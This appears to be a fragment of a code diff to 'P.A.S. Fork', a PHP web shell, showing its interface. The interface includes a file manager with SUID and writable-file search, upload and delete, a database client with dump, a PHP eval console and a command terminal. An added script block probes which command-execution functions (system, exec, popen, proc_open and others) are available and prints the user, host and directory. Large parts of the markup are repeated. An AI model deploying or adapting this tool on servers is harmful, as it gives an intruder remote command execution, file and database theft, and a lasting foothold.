class="spcr20"/><label class="option"title="exx: 0, &gt;1000, &lt;1005, 1010-1015">Group id<input type="text"name="g"/></label> <?php }?> </div><div class="flexRow"><label class="option"title="exx: &gt;1991-08-24 00:00:00, &lt;1991-08-24 00:00:00, 1991-08-24 00:00:00 - 1996-06-28 12:00:00, 1996-06-28 12:00:00">Created (UTC)<input type="text"name="e"/></label><hr class="spcr20"/><label class="option"title="exx: &gt;1991-08-24 00:00:00, &lt;1991-08-24 00:00:00, 1991-08-24 00:00:00 - 1996-06-28 12:00:00, 1996-06-28 12:00:00">Modified (UTC)<input type="text"name="m"/></label></div><div class="flexRow"><label class="option"title="exx: &gt;10, &lt;102400, 10-1024, 2048">Size (bytes)<input type="text"name="z"/></label><hr class="spcr20"/><div class="option">Text (<label title="Delimiter is pound (#)"><input type="checkbox"name="x"/>use regex</label>, <label><input type="checkbox"name="v"/>case-insensitive</label>)<input type="text"name="t"/></div></div><div class="flexRow"><label><input type="checkbox"name="l"/> Process links</label><hr class="spcrFlex"/><button>Search</button></div></form><form id="frmLnk"class="modal"onmousedown="uiActvModal(event)"onsubmit="mkLnk(event)"tabindex="-1"><div class="divCntrls"><span class="spnTitle">Create Link</span><a href="#"class="cntrl"title="Close"onclick="return uiClsModal('frmLnk')">&#x00D7;</a></div><label class="option">Target Path: <input type="text"name="p"required/></label><label class="option">Link Path: <input type="text"required/></label><div class="flexRow"><select name="t"><option value="0">Symbolic</option><option value="1">Hard</option></select><hr class="spcrFlex"/><button>Create</button></div></form><template id="tmplFrmPrps"><form class="modal frmFilesPrps"onmousedown="uiActvModal(event)"onsubmit="chngPrps(event)"tabindex="-1"><div class="divCntrls"><span class="spnTitle">Properties</span><a href="#"class="cntrl"title="Close without saving"onclick="return uiDstrModal(this.parentNode.parentNode)">&#x00D7;</a></div><label class="option">Path<input type="text"name="p"request/></label><div class="flexRow"><label class="option">Modified (UTC) <a href="#"class="cntrl arwDwn"onclick="setErlDate(event)"title="Set the earliest date from table"></a><input type="text"size="1"name="t"/></label> <?php if(NIX){?> <hr class="spcr20"/><label class="option">Permission<input type="text"size="1"name="e"/></label><hr class="spcr20"/><label class="option">Owner<input type="text"size="1"name="o"/></label><hr class="spcr20"/><label class="option">Group<input type="text"size="1"name="r"/></label></div><div class="flexRow"> <?php }?> <hr class="spcrFlex"/><button >Save</button></div></form></template><form id="frmBuffer"class="modal"onmousedown="uiActvModal(event)"tabindex="-1"><div class="divCntrls"><span class="spnTitle">Buffer</span><a href="#"class="cntrl"title="Close"onclick="return uiClsModal('frmBuffer')">&#x00D7;</a><a href="#"class="cntrl"title="Resize"onclick="return uiRsz('frmBuffer')">&#x2922;</a></div><table id="tblBuffer"onclick="onTblBufferClick(event)"><thead><tr><th width="20px"><input type="checkbox"onclick="uiCheckAll('Buffer', this.checked)"/></th><th>File</th><th width="35px">Act</th></tr></thead><tfoot><tr><th colspan="3"><button type="button"onclick="unmarkFiles()">Remove</button></th></tr></tfoot></table><template id="tmplBufferRow"><tr><td><input type="checkbox"name="f[]"/></td><td><a href="#"></a></td><td><a href="#"class="lnkAct">Rm</a></td></tr></template></form></div></div></span><span id="tabSQL"><a href="#tabSQL"class="tab">SQL Client</a><div class="tabPage"id="divPageSQL"><form class="toolbar"id="frmCnnct"onsubmit="return cnnct()"><select name="e"> <?php $a=array('MYSQL_NUM'=>array('MySQL','MySQL'),'MYSQLI_NUM'=>array('MySQLi','MySQLi'),'PDO::MYSQL_ATTR_INIT_COMMAND'=>array('MySQLPDO','MySQL (PDO)'),'MSSQL_NUM'=>array('MSSQL','MSSQL'),'SQLSRV_ERR_ALL'=>array('SQLSrv','MSSQL (SQLSrv)'),'PDO::PARAM_INT'=>array('MSSQLDBLIB','MSSQL (PDO_DBLIB)'),'PDO::PARAM_STR'=>array('MSSQLODBC','MSSQL (PDO_ODBC)'),'PDO::SQLSRV_ENCODING_UTF8'=>array('SQLSrvPDO','MSSQL (PDO_SQLSRV)'),'PGSQL_NUM'=>array('PGSQL','PostgreSQL'),'PDO::PARAM_LOB'=>array('PGSQLPDO','PostgreSQL (PDO)'));foreach($a as$k=>$v)if(defined($k))echo'<option value="',$v[0],'">',$v[1],'</option>';?> </select><input type="text"name="h"placeholder="Host"/><input type="text"name="u"placeholder="User"/><input type="text"name="p"placeholder="Password"/><input type="text"name="b"placeholder="Base"/><button>&gt;</button></form><div class="subbar"><span class="spnChrst"> <hr class="arwUp"/> <select id="sqlCSSend"><?php foreach($C as$k=>$v)echo'<option value="',$k,'">',$v,'</option>';?></select></span><span class="spnChrst"><hr class="arwDwn"/> <select id="sqlCSLoad"><?php foreach($C as$k=>$v)echo'<option value="',$k,'">',$v,'</option>';?> </select></span></div><div id="divSQL"><div id="divSQLWrpLeft"><div class="panel"><label><input type="checkbox"id="cbCR"/> Count number of rows</label></div><div class="panel"><div id="divSchm"></div></div><div class="panel"id="divDump">Dump as <select id="slctDmpFrmt"><option value="0">SQL</option><option value="1">CSV</option></select><button type="button"onclick="dump()">&gt;</button></div></div><div id="divSQLWrpRight"><form class="panel flexRow"id="frmSQL"onsubmit="return query()"><input type="text"name="q"placeholder="SQL query"/><button>&gt;</button></form><div id="divCptn"></div><div id="divData"><table id="tblHead"></table><table id="tblData"></table></div><form class="panel"id="frmPg"onsubmit="return chngPg(0)"><input type="hidden"name="b"/><input type="hidden"name="s"/><input type="hidden"name="t"/> Start from row <button type="button"onclick="chngPg(-1)">&lt;</button><input type="text"name="o"size="5"value="0"/><button type="button"onclick="chngPg(1)">&gt;</button><div style="float:right">Rows per page <input type="text"name="r"size="3"value="25"/><button>&gt;</button></div></form></div></div></div></span><span id="tabPHP"><a href="#tabPHP"class="tab">PHP Console</a><div class="tabPage"id="divPagePHP"><form class="toolbar"id="frmPHP"onsubmit="return evl()"><label><a href="#"title="Change composition"class="cmpsRow"id="aCmps"onclick="return uiChngCmps()">Composition</a></label><label title="Erase PHP code after successful eval"><input type="checkbox"id="cbClnInp"/> Clear input</label><label title="Erase previous results before show new"><input type="checkbox"id="cbClnOut" checked/> Clear output</label><label title="Render result as HTML"><input type="checkbox"id="cbHTML"/> Show as HTML</label><label><input type="checkbox"name="h"/> Hide PHP errors</label><div><span class="spnChrst"title="Send as..."><hr class="arwUp"/> <select id="slctPHPCS"><?php foreach($C as$v)echo'<option>',$v,'</option>';?></select></span><span class="spnChrst"title="Load as..."><hr class="arwDwn"/> <select name="c"><?php foreach($C as$k=>$v)echo'<option value="',$k,'">',$v,'</option>';?></select></span><button id="sbmPHP"title="Press Ctrl + Enter to evaluate code">Eval</button></div></form><div id="divPHP"><textarea name="e"form="frmPHP"id="txtPHP"placeholder="phpinfo();"onkeydown="onPHPKeyDwn(event)"></textarea><pre id="prePHP"onkeydown="onPHPResKeyDwn(event)"tabindex="-1"></pre></div></div></span><span id="tabTrm"><a href="#tabTrm"class="tab">Terminal</a><form class="tabPage"id="frmTrm"onsubmit="return exec()"><div class="toolbar"><label class="flexRow"title="Shell must be able to accept command from the argument 'c' (e.g.: $<?php echo NIX?"/bin/shell -c 'uname -a; id'":"cmd /c 'ver; pwd'";?>)">Shell: <input type="text"name="s"placeholder="<?php echo NIX?'/bin/sh':'';?>"/></label><label><input type="checkbox"name="h"> Don't show errors</label><label><input type="checkbox" id="cbIT"/>Invert output</label><label>Use function: <select name="f"></select></label><div><span class="spnChrst"title="Send as..."><hr class="arwUp"/> <select id="slctTrmCS"><?php foreach($C as$v)echo'<option>',$v,'</option>';?></select></span><span class="spnChrst"style="text-align:right"title="Load as..."><hr class="arwDwn"/> <select name="c"><?php foreach($C as$k=>$v)echo'<option value="',$k,'">',$v,'</option>';?></select></span></div></div><div id="divTrm"onclick="onTrmClick(event)"><pre id="preTrm"onkeydown="onTrmResKeyDwn(event)"tabindex="-1"></pre><div class="flexRow"><span id="spnUsrHst"></span>:<span id="spnPth"></span>$&nbsp;<input type="text"name="e"id="inpTrm"onkeydown="onTrmInpKeyDwn(event)"autocomplete="off"/></div></div></form></span><span id="tabInf"><a href="#tabInf"class="tab">Information</a><div class="tabPage"id="divInfo"><div class="toolbar"><div><a href="#"class="lnkAct"onclick="return ajxSnd('Get main info', onInfMain, null, {a:'i',t:'m'})">Main</a> / <a href="#"class="lnkAct"onclick="return ajxSnd('Get php info', onInfPHP, null, {a:'i',t:'p'})">PHP</a> / </div></div> <?php infMain(TRUE);?></div></span></div><div class="panel"id="divFtr"><div>P.A.S. Fork v. <?php echo VER;?></div><div id="divDtTm"title="Server Time"><span></span></div><div><a href="#"id="actLog"title="Message log"onclick="return uiShwModal('divLog')">&#x26A0;</a></div></div><div class="modal"onmousedown="uiActvModal(event)"id="divStngs"tabindex="-1"><div class="divCntrls">	<span class="spnTitle">Settings</span>	<a href="#"class="cntrl"title="Close"onclick="return uiClsModal('divStngs')">&#x00D7;</a></div>	<label class="option"><input onclick="COOKIE = (this.checked ? 1 : 0)" type="checkbox" id="cbCO"/> Use cookie to request</label>	<label class="option"><input type="checkbox" id="cbRR"/> Skip request encoding</label><label title="Raw Output mode for big files.&#10;Skip response encoding ('ob_*')." class="option"><input type="checkbox" id="cbRO"/> Skip response encoding</label><label title="Shown in File Manager" class="option"><input type="checkbox" id="cbTM"/> <b>ctime</b> instead of <b>mtime</b></label><label class="option"><input type="checkbox" id="cbOI"/> <b>iframe</b> instead of <b>xhr</b></label><form id="frmCstEnv"onsubmit="return false"><fieldset id="fldEnv"><legend><label><input type="checkbox"id="e"/> Run in custom environment</label></legend><label>Function: <select name="f"></select></label><label class="option">Shell: <input type="text"name="s"placeholder="<?php echo NIX?'/bin/sh':'';?>"/></label><label class="option">Interpreter: <input type="text"name="i"value="<?php if(PHP_VERSION>='5.4')echo escHTML(PHP_BINARY);?>"/></label><label class="option"><input type="checkbox"name="n"/> -n &nbsp;No php.ini file will be used</label><label class="option"><input type="checkbox"name="c"/> -C &nbsp;Do not chdir to the script's directory</label></fieldset></form></div><div class="modal"onmousedown="uiActvModal(event)"id="divLog"tabindex="-1"><div class="divCntrls"><span class="spnTitle">Message Log</span><a href="#"class="cntrl"title="Close"onclick="return uiClsModal('divLog')">&#x00D7;</a><a href="#"class="cntrl"title="Resize"onclick="return uiRsz('divLog')">&#x2922;</a><a href="#"class="cntrl"title="Clear"onclick="return clnLog()">&#8802;</a></div><div id="divLogCntn"></div></div><div id="divMsgs"class="divCntrls"></div></body>
-<?php if($GLOBALS['ACECONF']['URL']){ ?>
+<script id="dataExe"type="text/data"><?php $a=array('system','passthru','backticks','shell_exec','exec','popen');if(PHP_VERSION>='4.3')$a[]='proc_open';if(safemode())$a[101]='safemode';/*if(defined('EXP_EOF')){$a[7]='expect://';$a[8]='expect_popen';}*/if(!NIX&&defined('CLSCTX_ALL'))$a[10]='com';/*$s=NIX?';':'&';$c=NIX?'pwd':'cd';$w=NIX?'whoami':'echo %username%';foreach($a as$k=>$v)exe('echo '.$k.':'.$v.$s.$w.$s.'hostname'.$s.$c,$k,'',FALSE);*/foreach($a as $k => $v){if(function_exists($v)) print $k.':'.$v."\n".get_current_user()."\n".gethostname()."\n".__DIR__."\n";}?></script></head><body onkeydown="uiKeyDwn(event)"><div id="divHdr"class="divCntrls"><a href="#"class="cntrl"title="Color mode"onclick="return invertColors()">&#x23FA;</a><a href="#"class="cntrl"title="Resize view"onclick="return uiRszBody()">&#x21C4;</a><a href="#"class="cntrl"title="Settings"onclick="return uiShwModal('divStngs')">&#x2699;</a></div><div id="divBody"><span id="tabFM"><a href="#tabFM"class="tab">File Manager</a><div class="tabPage"id="divFM"><textarea id="txtClpbrd"tabindex="-1"></textarea><form hidden id="frmUpl"><input type="file"name="f[]"id="inpUpl" onchange="uplFiles()"/></form><form class="toolbar"id="frmFM"onsubmit="return goTo(this.p.value)"><a href="#"class="cntrl"id="btnSrch"title="Search..."onclick="return uiShwFrmSrch()"></a><button type="button"title="Go home!"onclick="goTo('~')">~</button> <?php if(!NIX){$a=range('A','Z');foreach($a as$v){$i=new FileInfo($v.':\\');if($i->isDir())echo'<button type="button"onclick="goTo(',"'",$v,":\\\\'",')">',$v,':</button>';}}?> <input type="text"name="p"value="<?php echo escHTML(selfPath());?>"/><button title="Go!">&gt;</button><span class="spnBtnSbMn"><button type="button"id="btnFastAct"title="Fast actions..."onclick="uiTgglSubMenu(event)"onblur="menuButtonBlur(this)"><hr class="arwDwn"/></button><div class="divSbMn"onclick="onFastActClick(event)"><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Properties</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Download</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Delete</a></div></span>&nbsp; <span class="spnChrst"title="Send as..."><hr class="arwUp"/> <select id="fmCSSend"><?php foreach($C as$v)echo'<option>',$v,'</option>';?></select></span><span class="spnChrst"title="Load as..."><hr class="arwDwn"/> <select id="fmCSLoad"><?php foreach($C as$k=>$v)echo'<option value="',$k,'">',$v,'</option>';?></select></span></form><div class="subbar"><button type="button"title="You can upload multiple files at once..."onclick="elmById('inpUpl').click()">Upload &#8230;</button><span class="spnBtnSbMn"><button type="button"class="btnSbMn"onclick="uiTgglSubMenu(event)"onblur="menuButtonBlur(this)">Create <hr class="arwDwn"/></button><div class="divSbMn"onclick="onCrtMenuClick(event)"><a href="#"class="aMnItm"onblur="menuItemBlur(this)">File</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Link</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Directory</a></div></span><span class="spnBtnSbMn"><button type="button"class="btnSbMn"id="btnBufferMenu"onclick="uiTgglSubMenu(event)"onblur="menuButtonBlur(this)"disabled>Buffer <hr class="arwDwn"/></button><div class="divSbMn"onclick="onBufferMenuClick(event)"><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Show files<a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Copy here</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Move here</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Download</a><a href="#"class="aMnItm"onblur="menuItemBlur(this)">Clear</a></div></span></div><div><form id="frmFiles"><table id="tblFiles"cols="<?php echo NIX?8:7;?>"onclick="onTblFilesClick(event)"><thead><tr><th width="20px"><input type="checkbox"onclick="uiCheckAll('Files', this.checked)"/></th><th>Name</th><th width="65px">Ext</th><th width="105px">Size</th><th width="145px">Modified (UTC)</th><th width="95px">Permission</th> <?php if(NIX){?><th width="155px">Owner</th><?php }?> <th width="65px">Actions</th></tr></thead><tfoot><tr><th colspan="<?php echo NIX?8:7;?>"><button type="button"onclick="dwnFiles(getSlctdFiles())">Download</button><button type="button"onclick="prpsSlctdFiles()">Properties</button><button type="button"onclick="markSlctdFiles()">Mark</button><button type="button"onclick="delFiles(getSlctdFiles())">Delete</button></th></tr></tfoot></table></form></div><template id="tmplFilesTBody"><tbody><tr><th colspan="<?php echo NIX?8:7;?>"class="thPth"></th></tr><tr><td class="tdUp"><input type="hidden"/>&#x21b4;</td><td colspan="<?php echo NIX?7:6;?>"><a href="#"class="lnkBlck">[ .. ]</a></td></tr></tbody></template><template id="tmplFileRow"><tr><td><input type="checkbox"name="f[]"/></td><td><a href="#"class="lnkBlck"></a></td><td><a href="#"class="lnkBlck"></a></td><td><a href="#"class="lnkAct"></a></td><td></td><td><a href="#"class="lnkAct"></a></td><?php if(NIX){?><td></td><?php }?><td><a href="#"class="lnkAct">Mrk</a>&nbsp;<a href="#"class="lnkAct">Del</a></td></tr></template><div id="divWndws"><template id="tmplFrmFile"><form class="modal frmFile"onsubmit="saveFile(event)"onmousedown="uiActvModal(event)"tabindex="-1"><div class="divCntrls"ondblclick="return uiRsz(this.parentNode)"><span class="spnTitle">New File</span><a href="#"class="cntrl"title="Close"onclick="return uiDstrModal(this.parentNode.parentNode)">&#x00D7;</a><a href="#"class="cntrl"title="Resize"onclick="return uiRsz(this.parentNode.parentNode)">&#x2922;</a><a href="#"class="cntrl"title="Reload file"onclick="rldFile(event)">&#x27F3;</a></div><textarea name="t"></textarea><div class="flexRow"><input type="text"required/><select name="c"title="File encoding..."onchange="rldFileAs(event)"><?php foreach($C as$k=>$v)echo'<option value="',$k,'">',$v,'</option>';?></select><select name="e"><option value="0">\r\n</option><option value="1"<?php if(NIX)echo' selected';?>>\n</option><option value="2">\r</option></select><button>Save</button></div></form></template><form id="frmSrch"class="modal"onmousedown="uiActvModal(event)"onsubmit="srchFiles(event)"tabindex="-1"><div class="divCntrls"><span class="spnTitle">Search</span><a href="#"class="cntrl"title="Close"onclick="return uiClsModal('frmSrch')">&#x00D7;</a></div><label class="option"title="exx: <?php echo NIX?'/var/www:/etc:/tmp/':'c:\\inetpub\\wwwroot;d:\\www\\';?>">Paths<input type="text"required /></label><div class="flexRow noFlex"><div class="option"> Name (<label title="? - single char; * - zero or more char; [!0123A-Z] - class of chars (- for range, ! to exclude)"><input type="checkbox"name="w"/>wildcard</label>, <label><input type="checkbox"name="i"/>case-insensitive</label>) <input type="text"name="n"/></div><label class="option"title="Max search depth">Depth<input type="text"name="d"size="1"size="1"/></label><label class="option">Type <select name="y"onchange="uiSrchFTypeChngd()"><option value="">Any</option><option value="1">Dirs</option><option value="0">Files</option></select></label><label class="option">Mode <select name="p"><option value="">Any</option><option value="1">Readable</option><option value="2">Writable</option><option value="3">Full access</option></select></label> <?php if(NIX){?> <label class="option"> Attribute <select name="u"><option value="">Any</option><option value="1">SUID</option></select></label></div><div class="flexRow"><label class="option"title="exx: 0, &gt;1000, &lt;1005, 1010-1015">Owner id<input type="text"name="o"/></label><hr class="spcr20"/><label class="option"title="exx: 0, &gt;1000, &lt;1005, 1010-1015">Group id<input type="text"name="g"/></label> <?php }?> </div><div class="flexRow"><label class="option"title="exx: &gt;1991-08-24 00:00:00, &lt;1991-08-24 00:00:00, 1991-08-24 00:00:00 - 1996-06-28 12:00:00, 1996-06-28 12:00:00">Created (UTC)<input type="text"name="e"/></label><hr class="spcr20"/><label class="option"title="exx: &gt;1991-08-24 00:00:00, &lt;1991-08-24 00:00:00, 1991-08-24 00:00:00 - 1996-06-28 12:00:00, 1996-06-28 12:00:00">Modified (UTC)<input type="text"name="m"/></label></div><div class="flexRow"><label class="option"title="exx: &gt;10, &lt;102400, 10-1024, 2048">Size (bytes)<input type="text"name="z"/></label><hr class="spcr20"/><div class="option">Text (<label title="Delimiter is pound (#)"><input type="checkbox"name="x"/>use regex</label>, <label><input type="checkbox"name="v"/>case-insensitive</label>)<input type="text"name="t"/></div></div><div class="flexRow"><label><input type="checkbox"name="l"/> Process links</label><hr class="spcrFlex"/><button>Search</button></div></form><form id="frmLnk"class="modal"onmousedown="uiActvModal(event)"onsubmit="mkLnk(event)"tabindex="-1"><div class="divCntrls"><span class="spnTitle">Create Link</span><a href="#"class="cntrl"title="Close"onclick="return uiClsModal('frmLnk')">&#x00D7;</a></div><label class="option">Target Path: <input type="text"name="p"required/></label><label class="option">Link Path: <input type="text"required/></label><div class="flexRow"><select name="t"><option value="0">Symbolic</option><option value="1">Hard</option></select><hr class="spcrFlex"/><button>Create</button></div></form><template id="tmplFrmPrps"><form class="modal frmFilesPrps"onmousedown="uiActvModal(event)"onsubmit="chngPrps(event)"tabindex="-1"><div class="divCntrls"><span class="spnTitle">Properties</span><a href="#"class="cntrl"title="Close without saving"onclick="return uiDstrModal(this.parentNode.parentNode)">&#x00D7;</a></div><label class="option">Path<input type="text"name="p"request/></label><div class="flexRow"><label class="option">Modified (UTC) <a href="#"class="cntrl arwDwn"onclick="setErlDate(event)"title="Set the earliest date from table"></a><input type="text"size="1"name="t"/></label> <?php if(NIX){?> <hr class="spcr20"/><label class="option">Permission<input type="text"size="1"name="e"/></label><hr class="spcr20"/><label class="option">Owner<input type="text"size="1"name="o"/></label><hr class="spcr20"/><label class="option">Group<input type="text"size="1"name="r"/></label></div><div class="flexRow"> <?php }?> <hr class="spcrFlex"/><button >Save</button></div></form></template><form id="frmBuffer"class="modal"onmousedown="uiActvModal(event)"tabindex="-1"><div class="divCntrls"><span class="spnTitle">Buffer</span><a href="#"class="cntrl"title="Close"onclick="return uiClsModal('frmBuffer')">&#x00D7;</a><a href="#"class="cntrl"title="Resize"onclick="return uiRsz('frmBuffer')">&#x2922;</a></div><table id="tblBuffer"onclick="onTblBufferClick(event)"><thead><tr><th width="20px"><input type="checkbox"onclick="uiCheckAll('Buffer', this.checked)"/></th><th>File</th><th width="35px">Act</th></tr></thead><tfoot><tr><th colspan="3"><button type="button"onclick="unmarkFiles()">Remove</button></th></tr></tfoot></table><template id="tmplBufferRow"><tr><td><input type="checkbox"name="f[]"/></td><td><a href="#"></a></td><td><a href="#"class="lnkAct">Rm</a></td></tr></template></form></div></div></span><span id="tabSQL"><a href="#tabSQL"class="tab">SQL Client</a><div class="tabPage"id="divPageSQL"><form class="toolbar"id="frmCnnct"onsubmit="return cnnct()"><select name="e"> <?php $a=array('MYSQL_NUM'=>array('MySQL','MySQL'),'MYSQLI_NUM'=>array('MySQLi','MySQLi'),'PDO::MYSQL_ATTR_INIT_COMMAND'=>array('MySQLPDO','MySQL (PDO)'),'MSSQL_NUM'=>array('MSSQL','MSSQL'),'SQLSRV_ERR_ALL'=>array('SQLSrv','MSSQL (SQLSrv)'),'PDO::PARAM_INT'=>array('MSSQLDBLIB','MSSQL (PDO_DBLIB)'),'PDO::PARAM_STR'=>array('MSSQLODBC','MSSQL (PDO_ODBC)'),'PDO::SQLSRV_ENCODING_UTF8'=>array('SQLSrvPDO','MSSQL (PDO_SQLSRV)'),'PGSQL_NUM'=>array('PGSQL','PostgreSQL'),'PDO::PARAM_LOB'=>array('PGSQLPDO','PostgreSQL (PDO)'));foreach($a as$k=>$v)if(defined($k))echo'<option value="',$v[0],'">',$v[1],'</option>';?> </select><input type="text"name="h"placeholder="Host"/><input type="text"name="u"placeholder="User"/><input type="text"name="p"placeholder="Password"/><input type="text"name="b"placeholder="Base"/><button>&gt;</button></form><div class="subbar"><span class="spnChrst"> <hr class="arwUp"/> <select id="sqlCSSend"><?php foreach($C as$k=>$v)echo'<option value="',$k,'">',$v,'</option>';?></select></span><span class="spnChrst"><hr class="arwDwn"/> <select id="sqlCSLoad"><?php foreach($C as$k=>$v)echo'<option value="',$k,'">',$v,'</option>';?> </select></span></div><div id="divSQL"><div id="divSQLWrpLeft"><div class="panel"><label><input type="checkbox"id="cbCR"/> Count number of rows</label></div><div class="panel"><div id="divSchm"></div></div><div class="panel"id="divDump">Dump as <select id="slctDmpFrmt"><option value="0">SQL</option><option value="1">CSV</option></select><button type="button"onclick="dump()">&gt;</button></div></div><div id="divSQLWrpRight"><form class="panel flexRow"id="frmSQL"onsubmit="return query()"><input type="text"name="q"placeholder="SQL query"/><button>&gt;</button></form><div id="divCptn"></div><div id="divData"><table id="tblHead"></table><table id="tblData"></table></div><form class="panel"id="frmPg"onsubmit="return chngPg(0)"><input type="hidden"name="b"/><input type="hidden"name="s"/><input type="hidden"name="t"/> Start from row <button type="button"onclick="chngPg(-1)">&lt;</button><input type="text"name="o"size="5"value="0"/><button type="button"onclick="chngPg(1)">&gt;</button><div style="float:right">Rows per page <input type="text"name="r"size="3"value="25"/><button>&gt;</button></div></form></div></div></div></span><span id="tabPHP"><a href="#tabPHP"class="tab">PHP Console</a><div class="tabPage"id="divPagePHP"><form class="toolbar"id="frmPHP"onsubmit="return evl()"><label><a href="#"title="Change composition"class="cmpsRow"id="aCmps"onclick="return uiChngCmps()">Composition</a></label><label title="Erase PHP code after successful eval"><input type="checkbox"id="cbClnInp"/> Clear input</label><label title="Erase previous results before show new"><input type="checkbox"id="cbClnOut" checked/> Clear output</label><label title="Render result as HTML"><input type="checkbox"id="cbHTML"/> Show as HTML</label><label><input type="checkbox"name="h"/> Hide PHP errors</label><div><span class="spnChrst"title="Send as..."><hr class="arwUp"/> <select id="slctPHPCS"><?php foreach($C as$v)echo'<option>',$v,'</option>';?></select></span><span class="spnChrst"title="Load as..."><hr class="arwDwn"/> <select name="c"><?php foreach($C as$k=>$v)echo'<option value="',$k,'">',$v,'</option>';?></select></span><button id="sbmPHP"title="Press Ctrl + Enter to evaluate code">Eval</button></div></form><div id="divPHP"><textarea name="e"form="frmPHP"id="txtPHP"placeholder="phpinfo();"onkeydown="onPHPKeyDwn(event)"></textarea><pre id="prePHP"onkeydown="onPHPResKeyDwn(event)"tabindex="-1"></pre></div></div></span><span id="tabTrm"><a href="#tabTrm"class="tab">Terminal</a><form class="tabPage"id="frmTrm"onsubmit="return exec()"><div class="toolbar"><label class="flexRow"title="Shell must be able to accept command from the argument 'c' (e.g.: $<?php echo NIX?"/bin/shell -c 'uname -a; id'":"cmd /c 'ver; pwd'";?>)">Shell: <input type="text"name="s"placeholder="<?php echo NIX?'/bin/sh':'';?>"/></label><label><input type="checkbox"name="h"> Don't show errors</label><label><input type="checkbox" id="cbIT"/> Invert output</label><label>Use function: <select name="f"></select></label><div><span class="spnChrst"title="Send as..."><hr class="arwUp"/> <select id="slctTrmCS"><?php foreach($C as$v)echo'<option>',$v,'</option>';?></select></span><span class="spnChrst"style="text-align:right"title="Load as..."><hr class="arwDwn"/> <select name="c"><?php foreach($C as$k=>$v)echo'<option value="',$k,'">',$v,'</option>';?></select></span></div></div><div id="divTrm"onclick="onTrmClick(event)"><pre id="preTrm"onkeydown="onTrmResKeyDwn(event)"tabindex="-1"></pre><div class="flexRow"><span id="spnUsrHst"></span>:<span id="spnPth"></span>$&nbsp;<input type="text"name="e"id="inpTrm"onkeydown="onTrmInpKeyDwn(event)"autocomplete="off"/></div></div></form></span><span id="tabInf"><a href="#tabInf"class="tab">Information</a><div class="tabPage"id="divInfo"><div class="toolbar"><div><a href="#"class="lnkAct"onclick="return ajxSnd('Get main info', onInfMain, null, {a:'i',t:'m'})">Main</a> / <a href="#"class="lnkAct"onclick="return ajxSnd('Get php info', onInfPHP, null, {a:'i',t:'p'})">PHP</a> / </div></div> <?php infMain(TRUE);?></div></span></div><div class="panel"id="divFtr"><div><a href="https://github.com/cr1f/P.A.S.-Fork/"target="blank">P.A.S. Fork v. <?php echo VER;?></a></div><div id="divDtTm"title="Server Time"><span></span></div><div><a href="#"id="actLog"title="Message log"onclick="return uiShwModal('divLog')">&#x26A0;</a></div></div><div class="modal"onmousedown="uiActvModal(event)"id="divStngs"tabindex="-1"><div class="divCntrls">	<span class="spnTitle">Settings</span>	<a href="#"class="cntrl"title="Close"onclick="return uiClsModal('divStngs')">&#x00D7;</a></div>	<label class="option"><input onclick="COOKIE = (this.checked ? 1 : 0)" type="checkbox" id="cbCO"/> Use cookie to request</label>	<label class="option"><input type="checkbox" id="cbRR"/> Skip request encoding</label><label title="Raw Output mode for big files.&#10;Skip response encoding ('ob_*')." class="option"><input type="checkbox" id="cbRO"/> Skip response encoding</label><label title="Shown in File Manager" class="option"><input type="checkbox" id="cbTM"/> <b>ctime</b> instead of <b>mtime</b></label><label class="option"><input type="checkbox" id="cbOI"/> <b>iframe</b> instead of <b>xhr</b></label><form id="frmCstEnv"onsubmit="return false"><fieldset id="fldEnv"><legend><label><input type="checkbox"id="e"/> Run in custom environment</label></legend><label>Function: <select name="f"></select></label><label class="option">Shell: <input type="text"name="s"placeholder="<?php echo NIX?'/bin/sh':'';?>"/></label><label class="option">Interpreter: <input type="text"name="i"value="<?php if(PHP_VERSION>='5.4')echo escHTML(PHP_BINARY);?>"/></label><label class="option"><input type="checkbox"name="n"/> -n &nbsp;No php.ini file will be used</label><label class="option"><input type="checkbox"name="c"/> -C &nbsp;Do not chdir to the script's directory</label></fieldset></form></div><div class="modal"onmousedown="uiActvModal(event)"id="divLog"tabindex="-1"><div class="divCntrls"><span class="spnTitle">Message Log</span><a href="#"class="cntrl"title="Close"onclick="return uiClsModal('divLog')">&#x00D7;</a><a href="#"class="cntrl"title="Resize"onclick="return uiRsz('divLog')">&#x2922;</a><a href="#"class="cntrl"title="Clear"onclick="return clnLog()">&#8802;</a></div><div id="divLogCntn"></div></div><div id="divMsgs"class="divCntrls"></div></body>
+<?=paramsHandlerJS()?>
 <script>
+<?php if($GLOBALS['ACECONF']['URL']){ ?>
 function aceEditorProcess(element){
 
 	if(typeof ace == 'undefined'){
@@ -6990,8 +7047,8 @@ function aceEditorProcess(element){
 		return false;
 	}
 	
-	var aceEditorModes = ['php', 'perl', 'python', 'sql', 'sh', 'javascript', 'powershell', 'apache_conf', 'nginx'];
-	var aceEditorThemes = ['crimson_editor', 'eclipse', 'dreamweaver', 'solarized_light', 'xcode', 'katzenmilch', 'dawn', 'iplastic', 'monokai', 'cobalt', 'nord_dark'];
+	var aceEditorModes = ['php', 'perl', 'python', 'golang', 'ruby', 'javascript', 'sh', 'powershell' , 'sql', 'apache_conf', 'nginx', 'lua', 'markdown'];
+	var aceEditorThemes = ['eclipse', 'dreamweaver', 'crimson_editor', 'sqlserver', 'solarized_light', 'xcode', 'katzenmilch', 'dawn', 'iplastic', 'monokai', 'ambiance', 'cobalt', 'nord_dark'];
 	var parentForm = getParentFormOf(element);
 	var eId = parentForm.name = (parentForm.name ? parentForm.name : Math.random().toString(36).substring(2, 15));
 	var flexRow = parentForm.children[2];
@@ -7015,14 +7072,28 @@ function aceEditorProcess(element){
 		return false;
 	}
 
+	var hotKeys = `
+		if(event.ctrlKey){
+			if(event.keyCode === 83){
+				getParentFormOf(this).elements[6].click(); return false;
+			}
+			if(event.keyCode === 69){
+				aceEditor['` + eId + `'].setOption('wrap', (aceEditor['` + eId + `'].getOption('wrap') == 'free' ? 'off' : 'free'));
+				return false;
+			}
+		}
+	`;
+	var hotKeysHint = `Ctrl + [KEY]:\n\nS - Save\nE - Line wrap\nL - Go to line\nP - Go to bracket\nH - Find and Replace\n\nSee the AceJS wiki for more.`;
+
